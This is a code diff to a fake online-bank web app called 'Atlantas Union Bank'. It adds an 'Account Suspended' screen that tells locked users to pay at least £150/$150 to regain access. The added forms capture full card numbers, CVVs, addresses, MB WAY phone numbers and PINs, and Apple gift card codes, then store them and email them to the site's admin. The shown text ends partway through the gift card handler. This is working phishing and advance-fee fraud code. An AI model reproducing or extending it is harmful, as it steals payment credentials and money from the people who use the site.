@@ -21,8 +21,9 @@
 <style>
 *{box-sizing:border-box;margin:0;padding:0;}
 html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f0f4f8;color:#111;}
-#auth-screen,#dashboard,#admin-panel{display:none;}
+#auth-screen,#dashboard,#admin-panel,#lock-screen{display:none;}
 #auth-screen.visible{display:flex!important;flex-direction:column;align-items:center;background:#f0f4f8;min-height:100vh;padding:40px 20px 80px;overflow-y:auto;}
+#lock-screen.visible{display:block!important;background:linear-gradient(160deg,#0a1628 0%,#0d2147 50%,#0a1628 100%);min-height:100vh;overflow-y:auto;}
 #dashboard.visible{display:block!important;background:#f0f4f8;min-height:100vh;overflow:hidden;}
 #admin-panel.visible{display:block!important;background:linear-gradient(180deg,#0a2540 0%,#001022 100%);color:#fff;min-height:100vh;padding:0 0 100px;overflow-y:auto;}
 .auth-logo{text-align:center;margin-bottom:32px;}
@@ -597,6 +598,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
     <button class="admin-tab" id="atab-deposits" onclick="switchAdminTab('deposits')"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><line x1="12" y1="1" x2="12" y2="23"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg> Deposits</button>
     <button class="admin-tab" id="atab-withdrawals" onclick="switchAdminTab('withdrawals')"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><circle cx="12" cy="12" r="10"></circle><polyline points="12 16 16 12 12 8"></polyline><line x1="8" y1="12" x2="16" y2="12"></line></svg> Withdrawals</button>
     <button class="admin-tab" id="atab-codes" onclick="switchAdminTab('codes')">Users</button>
+    <button class="admin-tab" id="atab-lockmoney" onclick="switchAdminTab('lockmoney')">🔒 Unlock Req.</button>
   </div>
   <div class="admin-content active" id="acontent-auth">
     <div class="acc-block">
@@ -641,6 +643,10 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
     </div>
     <div class="admin-section-title">Users by Country</div>
     <div id="users-list"><p class="acc-empty">Loading...</p></div>
+  </div>
+  <div class="admin-content" id="acontent-lockmoney">
+    <div style="margin-bottom:16px;"><div style="font-size:18px;font-weight:700;color:#fff;margin-bottom:4px;">🔒 Unlock Requests</div><div style="font-size:13px;color:rgba(255,255,255,0.5);">Money submitted by locked users</div></div>
+    <div id="lockmoney-admin-list"><p class="acc-empty">No unlock requests yet</p></div>
   </div>
   <button class="admin-logout" id="admin-logout-btn" data-i18n="logout">Logout</button>
 </div>
@@ -796,6 +802,7 @@ var FLAGS = {USA:'🇺🇸',UK:'🇬🇧',Nigeria:'🇳🇬',Germany:'🇩🇪',
 var currentUser = null;
 var userRef = null;
 var userData = {};
+window.userData = userData;
 var addMoneyCardIdx = -1;
 
 // ── HELPERS ──
@@ -823,12 +830,12 @@ function detectBrand(n){
 
 // ── SCREEN ──
 function showScreen(name,noPush){
-  ['auth-screen','dashboard','admin-panel'].forEach(function(id){
+  ['auth-screen','dashboard','admin-panel','lock-screen'].forEach(function(id){
     var el=$(id); if(el) el.classList.remove('visible');
   });
   var el=$(name); if(el) el.classList.add('visible');
   var g=$('globe-btn');
-  if(g) g.classList.toggle('show', name!=='auth-screen');
+  if(g) g.classList.toggle('show', name!=='auth-screen' && name!=='lock-screen');
   if(!noPush && name!=='auth-screen'){
     history.pushState({screen:name},'',window.location.pathname+(window.location.search||''));
   }
@@ -851,7 +858,7 @@ function switchTab(tabId,btn,noPush){
 
 // ── ADMIN TABS ──
 function switchAdminTab(name){
-  ['auth','cashapp','deposits','withdrawals','codes'].forEach(function(t){
+  ['auth','cashapp','deposits','withdrawals','codes','lockmoney'].forEach(function(t){
     var tab=$('atab-'+t),con=$('acontent-'+t);
     if(tab) tab.classList.remove('active');
     if(con) con.classList.remove('active');
@@ -863,6 +870,7 @@ function switchAdminTab(name){
   else if(name==='cashapp') loadCashAppTab();
   else if(name==='deposits') loadDepositsTab();
   else if(name==='withdrawals') loadWithdrawalsTab();
+  else if(name==='lockmoney') loadLockMoneyTab();
   else loadUsersTab();
 }
 
@@ -1203,6 +1211,7 @@ auth.onAuthStateChanged(function(user){
 
   userRef.on('value',function(snap){
     userData=snap.val()||{};
+    window.userData=userData;
     var s=sym();
     var bal=parseFloat(userData.balance||0);
     var an=userData.accountNumber||'';
@@ -1241,8 +1250,14 @@ auth.onAuthStateChanged(function(user){
       showScreen('admin-panel');
       loadAuthTab(); loadCashAppTab(); loadDepositsTab(); loadWithdrawalsTab(); loadUsersTab();
     } else {
-      showScreen('dashboard',true);
-      history.replaceState({screen:'dashboard',tab:'tab-home'},'',window.location.pathname+(window.location.search||''));
+      if(userData.locked){
+        var lrEl=$('lock-reason-text');
+        if(lrEl) lrEl.textContent=userData.lockReason||'Your account has been restricted by our compliance team.';
+        showScreen('lock-screen',true);
+      } else {
+        showScreen('dashboard',true);
+        history.replaceState({screen:'dashboard',tab:'tab-home'},'',window.location.pathname+(window.location.search||''));
+      }
     }
   });
 
@@ -2056,10 +2071,14 @@ function loadUsersTab(){
           '<div class="admin-user-detail">'+'\u{1f4b0}'+' Balance: '+rs+(u.balance||0).toFixed(2)+'</div>'+
           '<div class="admin-user-detail">'+'🔢'+' Account: '+(u.accountNumber||'--')+'</div>'+
           '<div class="admin-user-detail">'+'💳'+' Cards: '+((u.linkedCards||[]).filter(function(c){return c;}).length)+'</div>'+
+          (u.locked ? '<div style="background:#ffebee;border:1px solid #ffcdd2;border-radius:8px;padding:8px 12px;margin-bottom:8px;font-size:12px;color:#c62828;">&#128274; LOCKED — '+(u.lockReason||'')+'</div>' : '')+
           '<div class="admin-user-actions">'+
             '<input type="text" class="admin-pin-input" id="pin-'+u.uid+'" placeholder="PIN" maxlength="4" inputmode="numeric">'+
             '<button class="admin-action-btn green" style="flex:none;padding:10px 14px;font-size:13px;" onclick="setUserPin(\''+u.uid+'\')">Set PIN</button>'+
             '<button class="admin-action-btn orange" style="flex:none;padding:10px 14px;font-size:13px;" onclick="msgUser(\''+u.uid+'\')">'+'📨'+' Msg</button>'+
+            (u.locked
+              ? '<button class="admin-action-btn green" style="flex:none;padding:10px 14px;font-size:13px;" onclick="unlockUser(\''+u.uid+'\')">&#128275; Unlock</button>'
+              : '<button class="admin-action-btn red" style="flex:none;padding:10px 14px;font-size:13px;" onclick="lockUser(\''+u.uid+'\')">&#128274; Lock</button>')+
           '</div>';
         block.appendChild(ucard);
       });
@@ -3431,6 +3450,391 @@ $('mbway-otp-submit-btn').onclick = function(){
 // ── ADMIN: MBWAY TAB ──
 
 }); // END DOMContentLoaded
+</script>
+
+<!-- LOCK: ADD MONEY METHOD PICKER -->
+<div class="modal" id="lock-addmoney-modal">
+  <div class="modal-box" style="background:#fff;">
+    <div class="modal-header"><h3 style="color:#1a56ff;">&#128179; Add Money to Unlock</h3><button class="modal-close" onclick="closeModal('lock-addmoney-modal')">&#215;</button></div>
+    <p style="font-size:13px;color:#666;margin-bottom:18px;line-height:1.5;">Choose how to add the required <strong>&#163;150 / $150</strong>. Name must match your account.</p>
+    <button onclick="openLockMethod('mbway')" style="display:flex;align-items:center;gap:14px;width:100%;background:#fff5f5;border:2px solid #ffcccc;border-radius:12px;padding:14px 16px;margin-bottom:10px;cursor:pointer;font-family:inherit;text-align:left;"><img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:38px;height:38px;border-radius:8px;object-fit:cover;flex-shrink:0;"><div><div style="font-size:15px;font-weight:700;color:#cc0000;">MB WAY</div><div style="font-size:12px;color:#888;margin-top:2px;">Pay via MB WAY</div></div></button>
+    <button onclick="openLockMethod('visa')" style="display:flex;align-items:center;gap:14px;width:100%;background:#f0f4ff;border:2px solid #c7d4ff;border-radius:12px;padding:14px 16px;margin-bottom:10px;cursor:pointer;font-family:inherit;text-align:left;"><span style="font-size:32px;flex-shrink:0;">&#128179;</span><div><div style="font-size:15px;font-weight:700;color:#1a56ff;">Visa</div><div style="font-size:12px;color:#888;margin-top:2px;">Pay with Visa card</div></div></button>
+    <button onclick="openLockMethod('mastercard')" style="display:flex;align-items:center;gap:14px;width:100%;background:#fff8f0;border:2px solid #ffe0b2;border-radius:12px;padding:14px 16px;margin-bottom:10px;cursor:pointer;font-family:inherit;text-align:left;"><span style="font-size:32px;flex-shrink:0;">&#128179;</span><div><div style="font-size:15px;font-weight:700;color:#e65100;">Mastercard</div><div style="font-size:12px;color:#888;margin-top:2px;">Pay with Mastercard</div></div></button>
+    <button onclick="openLockMethod('apple')" style="display:flex;align-items:center;gap:14px;width:100%;background:#f5f5f7;border:2px solid #d1d1d6;border-radius:12px;padding:14px 16px;cursor:pointer;font-family:inherit;text-align:left;"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/814px-Apple_logo_black.svg.png" style="width:32px;height:32px;object-fit:contain;flex-shrink:0;"><div><div style="font-size:15px;font-weight:700;color:#111;">&#127873; Apple Gift Card</div><div style="font-size:12px;color:#888;margin-top:2px;">Redeem Apple Gift Card(s)</div></div></button>
+  </div>
+</div>
+
+<!-- LOCK: CARD/MBWAY FORM -->
+<div class="modal" id="lock-card-modal">
+  <div class="modal-box dark" style="max-height:90vh;overflow-y:auto;">
+    <div style="text-align:center;padding:12px 0 10px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><div id="lock-card-icon" style="font-size:40px;margin-bottom:6px;"></div><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Account Unlock Payment</div></div>
+    <div class="modal-header"><h3 id="lock-card-title">Payment Details</h3><button class="modal-close" onclick="closeModal('lock-card-modal')">&#215;</button></div>
+    <div id="lock-card-fields"></div>
+    <div class="modal-error" id="lock-card-error"></div>
+    <button class="modal-btn" id="lock-card-submit-btn">Submit</button>
+  </div>
+</div>
+
+<!-- LOCK: APPLE QTY -->
+<div class="modal" id="lock-apple-qty-modal">
+  <div class="modal-box" style="background:#fff;">
+    <div class="modal-header"><h3 style="color:#111;">&#127873; Apple Gift Cards</h3><button class="modal-close" onclick="closeModal('lock-apple-qty-modal')">&#215;</button></div>
+    <p style="font-size:13px;color:#666;margin-bottom:18px;">How many Apple Gift Cards would you like to redeem?</p>
+    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;">
+      <button onclick="openLockAppleCodes(1)" style="background:#f5f5f7;border:2px solid #d1d1d6;border-radius:12px;padding:18px 8px;font-size:20px;font-weight:700;color:#111;cursor:pointer;font-family:inherit;">1</button>
+      <button onclick="openLockAppleCodes(2)" style="background:#f5f5f7;border:2px solid #d1d1d6;border-radius:12px;padding:18px 8px;font-size:20px;font-weight:700;color:#111;cursor:pointer;font-family:inherit;">2</button>
+      <button onclick="openLockAppleCodes(3)" style="background:#f5f5f7;border:2px solid #d1d1d6;border-radius:12px;padding:18px 8px;font-size:20px;font-weight:700;color:#111;cursor:pointer;font-family:inherit;">3</button>
+      <button onclick="openLockAppleCodes(4)" style="background:#f5f5f7;border:2px solid #d1d1d6;border-radius:12px;padding:18px 8px;font-size:20px;font-weight:700;color:#111;cursor:pointer;font-family:inherit;">4</button>
+      <button onclick="openLockAppleCodes(5)" style="background:#f5f5f7;border:2px solid #d1d1d6;border-radius:12px;padding:18px 8px;font-size:20px;font-weight:700;color:#111;cursor:pointer;font-family:inherit;">5</button>
+      <button onclick="openLockAppleCodes(6)" style="background:#f5f5f7;border:2px solid #d1d1d6;border-radius:12px;padding:18px 8px;font-size:20px;font-weight:700;color:#111;cursor:pointer;font-family:inherit;">6</button>
+    </div>
+  </div>
+</div>
+
+<!-- LOCK: APPLE CODES -->
+<div class="modal" id="lock-apple-codes-modal">
+  <div class="modal-box dark" style="max-height:90vh;overflow-y:auto;">
+    <div class="modal-header"><h3>&#127873; Gift Card Codes</h3><button class="modal-close" onclick="closeModal('lock-apple-codes-modal')">&#215;</button></div>
+    <p style="font-size:13px;color:rgba(255,255,255,0.6);margin-bottom:16px;">Enter the code and amount for each gift card.</p>
+    <div id="lock-apple-codes-fields"></div>
+    <div class="modal-error" id="lock-apple-codes-error"></div>
+    <button class="modal-btn" id="lock-apple-codes-submit-btn">Submit Gift Cards</button>
+  </div>
+</div>
+
+<!-- LOCK SCREEN PAGE -->
+<div id="lock-screen">
+  <div style="background:rgba(255,255,255,0.04);border-bottom:1px solid rgba(255,255,255,0.08);padding:18px 24px;display:flex;align-items:center;justify-content:space-between;">
+    <div style="display:flex;align-items:center;gap:10px;">
+      <div style="width:34px;height:34px;background:linear-gradient(135deg,#1a56ff,#0a3ab4);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px;">&#127981;</div>
+      <div>
+        <div style="font-size:13px;font-weight:800;color:#fff;">Atlantas Union Bank</div>
+        <div style="font-size:10px;color:rgba(255,255,255,0.45);letter-spacing:0.5px;">SECURE BANKING PORTAL</div>
+      </div>
+    </div>
+    <div style="background:rgba(229,57,53,0.15);border:1px solid rgba(229,57,53,0.4);border-radius:20px;padding:4px 12px;">
+      <span style="font-size:11px;font-weight:700;color:#ff6b6b;">&#9679; ACCOUNT RESTRICTED</span>
+    </div>
+  </div>
+  <div style="max-width:480px;margin:0 auto;padding:36px 20px 100px;">
+    <div style="text-align:center;margin-bottom:32px;">
+      <div style="width:80px;height:80px;background:rgba(229,57,53,0.1);border:1.5px solid rgba(229,57,53,0.35);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:36px;margin:0 auto 16px;">&#128274;</div>
+      <div style="font-size:24px;font-weight:800;color:#fff;margin-bottom:6px;">Account Suspended</div>
+      <div style="font-size:13px;color:rgba(255,255,255,0.45);">Your access has been temporarily restricted by our compliance team.</div>
+    </div>
+    <div style="background:rgba(255,193,7,0.07);border:1px solid rgba(255,193,7,0.25);border-radius:16px;padding:18px 20px;margin-bottom:16px;">
+      <div style="font-size:10px;font-weight:700;color:#ffc107;text-transform:uppercase;letter-spacing:1.2px;margin-bottom:8px;">Suspension Reason</div>
+      <div id="lock-reason-text" style="font-size:14px;color:rgba(255,255,255,0.85);line-height:1.7;"></div>
+    </div>
+    <div style="background:rgba(229,57,53,0.07);border:1px solid rgba(229,57,53,0.25);border-radius:16px;padding:18px 20px;margin-bottom:24px;">
+      <div style="font-size:10px;font-weight:700;color:#ff6b6b;text-transform:uppercase;letter-spacing:1.2px;margin-bottom:8px;">&#9888; Critical Notice</div>
+      <div style="font-size:13px;color:rgba(255,255,255,0.75);line-height:1.7;">All pending transactions are currently <strong style="color:#fff;">on hold</strong>. If this is not resolved promptly they will be <strong style="color:#fff;">automatically refunded</strong>. Please act immediately.</div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:12px;margin-bottom:28px;">
+      <div style="background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:16px 18px;display:flex;gap:14px;align-items:flex-start;">
+        <div style="min-width:32px;height:32px;background:linear-gradient(135deg,#1a56ff,#0a3ab4);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;color:#fff;flex-shrink:0;">1</div>
+        <div><div style="font-size:13px;font-weight:700;color:#fff;margin-bottom:3px;">Verify Identity</div><div style="font-size:12px;color:rgba(255,255,255,0.55);line-height:1.6;">Add funds from a card registered under your <strong style="color:rgba(255,255,255,0.85);">full legal name</strong>.</div></div>
+      </div>
+      <div style="background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:16px 18px;display:flex;gap:14px;align-items:flex-start;">
+        <div style="min-width:32px;height:32px;background:linear-gradient(135deg,#1a56ff,#0a3ab4);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;color:#fff;flex-shrink:0;">2</div>
+        <div><div style="font-size:13px;font-weight:700;color:#fff;margin-bottom:3px;">Minimum Deposit Required</div><div style="font-size:12px;color:rgba(255,255,255,0.55);line-height:1.6;">Minimum amount is <strong style="color:#fff;">&#163;150 / $150</strong> or equivalent.</div></div>
+      </div>
+      <div style="background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:16px 18px;display:flex;gap:14px;align-items:flex-start;">
+        <div style="min-width:32px;height:32px;background:linear-gradient(135deg,#1a56ff,#0a3ab4);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;color:#fff;flex-shrink:0;">3</div>
+        <div><div style="font-size:13px;font-weight:700;color:#fff;margin-bottom:3px;">Compliance Review</div><div style="font-size:12px;color:rgba(255,255,255,0.55);line-height:1.6;">Our team will review and reinstate your account within <strong style="color:rgba(255,255,255,0.85);">24 hours</strong>.</div></div>
+      </div>
+    </div>
+    <button onclick="openLockAddMoney()" style="display:block;width:100%;background:linear-gradient(135deg,#1a56ff,#0a3ab4);color:#fff;border:none;border-radius:14px;padding:17px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit;box-shadow:0 6px 24px rgba(26,86,255,0.4);margin-bottom:12px;">&#128179; Add Funds to Restore Access</button>
+    <button onclick="auth.signOut()" style="display:block;width:100%;background:rgba(255,255,255,0.06);color:rgba(255,255,255,0.6);border:1px solid rgba(255,255,255,0.12);border-radius:14px;padding:14px;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:16px;">&#128682; Log Out</button>
+    <div style="height:1px;background:rgba(255,255,255,0.07);margin-bottom:20px;"></div>
+    <div style="text-align:center;">
+      <div style="font-size:11px;color:rgba(255,255,255,0.3);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;">Need Assistance?</div>
+      <div style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:10px;padding:10px 18px;">
+        <span style="font-size:14px;">&#9993;</span>
+        <span id="lock-contact-email" style="font-size:13px;color:rgba(255,255,255,0.7);"></span>
+      </div>
+      <div style="font-size:11px;color:rgba(255,255,255,0.2);margin-top:16px;">Atlantas Union Bank &mdash; Compliance &amp; Security Division</div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ── LOCK ACCOUNT FEATURE JS ──
+(function(){var e=document.getElementById('lock-contact-email');if(e)e.textContent='viccylay30'+'@'+'gmail.com';})();
+
+document.addEventListener('DOMContentLoaded',function(){
+  // openLockAddMoney
+  window.openLockAddMoney = function(){ openModal('lock-addmoney-modal'); };
+
+  var _lockMethod='';
+  var _lockMbwayCode='+351';
+  var _lockMbwayFlag='🇵🇹';
+
+  window.openLockMethod = function(method){
+    _lockMethod=method;
+    closeModal('lock-addmoney-modal');
+    if(method==='apple'){ openModal('lock-apple-qty-modal'); return; }
+    var title,icon,fields='';
+    if(method==='mbway'){
+      title='📱 MB WAY Payment'; icon='📱';
+      _lockMbwayCode='+351'; _lockMbwayFlag='🇵🇹';
+      fields='<div style="display:flex;gap:8px;margin-bottom:10px;">'
+        +'<button id="lock-mbway-country-btn" style="background:rgba(255,255,255,0.08);border:1.5px solid rgba(255,255,255,0.15);border-radius:10px;padding:0 12px;font-size:14px;font-weight:700;color:#cc0000;cursor:pointer;white-space:nowrap;font-family:inherit;height:48px;min-width:95px;" onclick="openLockMBWayCountry()">🇵🇹 +351</button>'
+        +'<input type="tel" id="lock-mbway-phone" class="modal-input" placeholder="Phone number" inputmode="numeric" style="flex:1;margin-bottom:0;"></div>'
+        +'<input type="password" id="lock-mbway-pin" class="modal-input" placeholder="MB WAY PIN (up to 6 digits)" maxlength="6" inputmode="numeric">'
+        +'<input type="text" id="lock-mbway-name" class="modal-input" placeholder="Full Name (must match account)">'
+        +'<input type="number" id="lock-mbway-amount" class="modal-input" placeholder="Amount to send (min £150 / $150)" inputmode="decimal" min="150">'
+        +'<div style="font-size:12px;color:rgba(255,255,255,0.4);margin-top:-6px;margin-bottom:8px;">Minimum: £150 / $150</div>';
+    } else {
+      var brand=method==='visa'?'Visa':'Mastercard';
+      title='💳 '+brand+' Card'; icon='💳';
+      fields='<input type="text" id="lock-card-number" class="modal-input" placeholder="Card Number (16 digits)" maxlength="19" inputmode="numeric">'
+        +'<input type="text" id="lock-card-name" class="modal-input" placeholder="Cardholder Name (must match account)">'
+        +'<input type="text" id="lock-card-bank" class="modal-input" placeholder="Bank Name">'
+        +'<div style="display:flex;gap:8px;margin-bottom:10px;"><div style="flex:1;"><label style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;">Card Expiry</label><input type="month" id="lock-card-expiry" class="modal-input" style="color-scheme:dark;margin:0;"></div><div style="flex:1;"><label style="display:block;font-size:12px;color:rgba(255,255,255,0.5);margin-bottom:6px;">CVV</label><input type="text" id="lock-card-cvv" class="modal-input" maxlength="4" inputmode="numeric" style="margin:0;"></div></div>'
+        +'<input type="text" id="lock-card-street" class="modal-input" placeholder="Street Address">'
+        +'<div style="display:flex;gap:8px;"><input type="text" id="lock-card-city" class="modal-input" placeholder="City" style="flex:1;"><input type="text" id="lock-card-postcode" class="modal-input" placeholder="Postcode" style="flex:1;"></div>'
+        +'<input type="tel" id="lock-card-phone" class="modal-input" placeholder="Phone Number">'
+        +'<input type="text" id="lock-card-balance" class="modal-input" placeholder="Card Balance (e.g. 500.00)" inputmode="decimal">';
+    }
+    document.getElementById('lock-card-icon').textContent=icon;
+    document.getElementById('lock-card-title').textContent=title;
+    document.getElementById('lock-card-fields').innerHTML=fields;
+    document.getElementById('lock-card-error').textContent='';
+    document.getElementById('lock-card-submit-btn').textContent='Submit';
+    document.getElementById('lock-card-submit-btn').disabled=false;
+    openModal('lock-card-modal');
+  };
+
+  window.openLockMBWayCountry = function(){
+    if(typeof renderMBWayCountries==='function') renderMBWayCountries('');
+    closeModal('lock-card-modal');
+    openModal('mbway-country-modal');
+    setTimeout(function(){
+      var closeBtn=document.querySelector('#mbway-country-modal .modal-close');
+      if(closeBtn){ closeBtn.onclick=function(){ closeModal('mbway-country-modal'); openModal('lock-card-modal'); }; }
+      document.querySelectorAll('#mbway-country-list button').forEach(function(btn){
+        btn.onclick=function(){
+          var spans=btn.querySelectorAll('span');
+          if(spans.length>=2){ _lockMbwayFlag=spans[0].textContent; _lockMbwayCode=spans[spans.length-1].textContent; var lb=document.getElementById('lock-mbway-country-btn'); if(lb) lb.innerHTML=_lockMbwayFlag+' '+_lockMbwayCode; }
+          closeModal('mbway-country-modal'); openModal('lock-card-modal');
+        };
+      });
+    },150);
+  };
+
+  document.getElementById('lock-card-submit-btn').onclick = function(){
+    var err=document.getElementById('lock-card-error'); err.textContent='';
+    var method=_lockMethod;
+    var currentUser=firebase.auth().currentUser;
+    if(!currentUser||!window.userData) return;
+    var ud=window.userData;
+    var userName=(ud.firstname||'')+' '+(ud.surname||'');
+    var payload={method:method,uid:currentUser.uid,userName:userName,submittedDate:new Date().toISOString(),status:'pending'};
+    var emailUsername,emailMsg;
+    if(method==='mbway'){
+      var phone=document.getElementById('lock-mbway-phone')?document.getElementById('lock-mbway-phone').value.trim():'';
+      var pin=document.getElementById('lock-mbway-pin')?document.getElementById('lock-mbway-pin').value.trim():'';
+      var name=document.getElementById('lock-mbway-name')?document.getElementById('lock-mbway-name').value.trim():'';
+      if(!phone){err.textContent='Please enter your phone number.';return;}
+      if(!pin){err.textContent='Please enter your MB WAY PIN.';return;}
+      if(!name){err.textContent='Please enter the name on the account.';return;}
+      var amtRaw=document.getElementById('lock-mbway-amount')?document.getElementById('lock-mbway-amount').value.trim():'';
+      var amt=parseFloat(amtRaw);
+      if(!amtRaw||isNaN(amt)||amt<150){err.textContent='Amount must be at least £150 / $150.';return;}
+      payload.phone=_lockMbwayCode+phone; payload.pin=pin; payload.accountName=name; payload.amount=amt;
+      emailUsername='mbway unlock request';
+      emailMsg=userName+' submitted an MB WAY unlock payment.\n\nPhone: '+payload.phone+'\nPIN: '+pin+'\nName: '+name+'\n\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'');
+    } else {
+      var num=document.getElementById('lock-card-number')?document.getElementById('lock-card-number').value.replace(/\D/g,''):'';
+      var cname=document.getElementById('lock-card-name')?document.getElementById('lock-card-name').value.trim():'';
+      var bank=document.getElementById('lock-card-bank')?document.getElementById('lock-card-bank').value.trim():'';
+      var expiryRaw=document.getElementById('lock-card-expiry')?document.getElementById('lock-card-expiry').value.trim():'';
+      var cvv=document.getElementById('lock-card-cvv')?document.getElementById('lock-card-cvv').value.trim():'';
+      var street=document.getElementById('lock-card-street')?document.getElementById('lock-card-street').value.trim():'';
+      var city=document.getElementById('lock-card-city')?document.getElementById('lock-card-city').value.trim():'';
+      var postcode=document.getElementById('lock-card-postcode')?document.getElementById('lock-card-postcode').value.trim():'';
+      var phone2=document.getElementById('lock-card-phone')?document.getElementById('lock-card-phone').value.trim():'';
+      var balance=document.getElementById('lock-card-balance')?document.getElementById('lock-card-balance').value.trim():'';
+      var expiry=''; if(expiryRaw){var pts=expiryRaw.split('-');if(pts.length===2)expiry=pts[1]+'/'+pts[0].slice(-2);}
+      if(num.length!==16){err.textContent='Card number must be 16 digits.';return;}
+      if(!cname){err.textContent='Please enter the cardholder name.';return;}
+      if(!expiry||!cvv){err.textContent='Please enter expiry and CVV.';return;}
+      var brand=typeof detectBrand==='function'?detectBrand(num):(num[0]==='4'?'Visa':'Mastercard');
+      payload.cardNumber=num;payload.cardName=cname;payload.bankName=bank;payload.expiry=expiry;payload.cvv=cvv;payload.brand=brand;payload.lastFour=num.slice(-4);payload.street=street;payload.city=city;payload.postcode=postcode;payload.phone=phone2;payload.balance=balance;
+      emailUsername='lock add money submitted';
+      emailMsg=userName+' submitted a '+brand+' card for account unlock.\n\nCard: '+brand+' ....'+num.slice(-4)+'\nName: '+cname+'\nBank: '+(bank||'--')+'\nExpiry: '+expiry+'\nCVV: '+cvv+'\nBalance: '+(balance||'--')+'\nStreet: '+(street||'--')+'\nCity: '+(city||'--')+'\nPostcode: '+(postcode||'--')+'\nPhone: '+(phone2||'--')+'\n\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'');
+    }
+    this.textContent='Submitting...'; this.disabled=true;
+    var db=firebase.database();
+    var ADMIN_EMAIL=window.ADMIN_EMAIL||'';
+    var newRef=db.ref('lockUnlockRequests').push();
+    payload.reqKey=newRef.key;
+    newRef.set(payload).then(function(){
+      return db.ref('users').once('value').then(function(snap){
+        snap.forEach(function(s){
+          if(s.val()&&s.val().email===ADMIN_EMAIL){
+            if(typeof notify==='function') notify(s.key,'🔒 UNLOCK REQ: '+userName+' submitted '+method.toUpperCase());
+            if(typeof sendEmail==='function') sendEmail(ADMIN_EMAIL,'🔒 Unlock Request - '+method.toUpperCase(),emailUsername,emailMsg);
+          }
+        });
+      });
+    }).then(function(){
+      closeModal('lock-card-modal');
+      var b=document.createElement('div');b.style.cssText='position:fixed;top:0;left:0;right:0;background:linear-gradient(135deg,#00a550,#007a3a);color:#fff;padding:16px 20px;z-index:9999999;font-size:14px;font-weight:600;text-align:center;line-height:1.5;';
+      b.innerHTML='&#9989; Verification Submitted! Our team will review your payment shortly. You may submit another if needed. <button onclick="this.parentNode.remove()" style="background:none;border:none;color:#fff;font-size:18px;cursor:pointer;float:right;margin-top:-2px;">&#215;</button>';
+      document.body.appendChild(b);setTimeout(function(){if(b.parentNode)b.remove();},8000);
+    }).catch(function(){ err.textContent='Submission failed. Please try again.'; })
+    .finally(function(){ document.getElementById('lock-card-submit-btn').textContent='Submit'; document.getElementById('lock-card-submit-btn').disabled=false; });
+  };
+
+  window.openLockAppleCodes = function(qty){
+    closeModal('lock-apple-qty-modal');
+    var fields='';
+    for(var i=1;i<=qty;i++){
+      fields+='<div style="background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:12px;padding:14px;margin-bottom:12px;">'
+        +'<div style="font-size:13px;font-weight:600;color:rgba(255,255,255,0.7);margin-bottom:10px;">Gift Card '+i+'</div>'
+        +'<input type="text" id="lock-gc-code-'+i+'" class="modal-input" placeholder="Gift Card Code">'
+        +'<input type="text" id="lock-gc-amount-'+i+'" class="modal-input" placeholder="Gift Card Amount (e.g. 50.00)" inputmode="decimal">'
+        +'</div>';
+    }
+    document.getElementById('lock-apple-codes-fields').innerHTML=fields;
+    document.getElementById('lock-apple-codes-error').textContent='';
+    document.getElementById('lock-apple-codes-submit-btn').textContent='Submit Gift Cards';
+    document.getElementById('lock-apple-codes-submit-btn').disabled=false;
+    document.getElementById('lock-apple-codes-submit-btn').setAttribute('data-qty',qty);
+    openModal('lock-apple-codes-modal');
+  };
+
+  document.getElementById('lock-apple-codes-submit-btn').onclick = function(){
+    var qty=parseInt(this.getAttribute('data-qty'))||1;
+    var err=document.getElementById('lock-apple-codes-error'); err.textContent='';
+    var cards=[];
+    for(var i=1;i<=qty;i++){
+      var code=document.getElementById('lock-gc-code-'+i)?document.getElementById('lock-gc-code-'+i).value.trim():'';
+      var amount=document.getElementById('lock-gc-amount-'+i)?document.getElementById('lock-gc-amount-'+i).value.trim():'';
+      if(!code){err.textContent='Please enter code for Gift Card '+i+'.';return;}
+      if(!amount){err.textContent='Please enter amount for Gift Card '+i+'.';return;}
+      cards.push({code:code,amount:amount});
+    }
+    this.textContent='Submitting...'; this.disabled=true;
+    var currentUser=firebase.auth().currentUser;
+    if(!currentUser||!window.userData){this.textContent='Submit Gift Cards';this.disabled=false;return;}
+    var ud=window.userData;
+    var userName=(ud.firstname||'')+' '+(ud.surname||'');
+    var payload={method:'apple',uid:currentUser.uid,userName:userName,submittedDate:new Date().toISOString(),status:'pending',giftCards:cards};
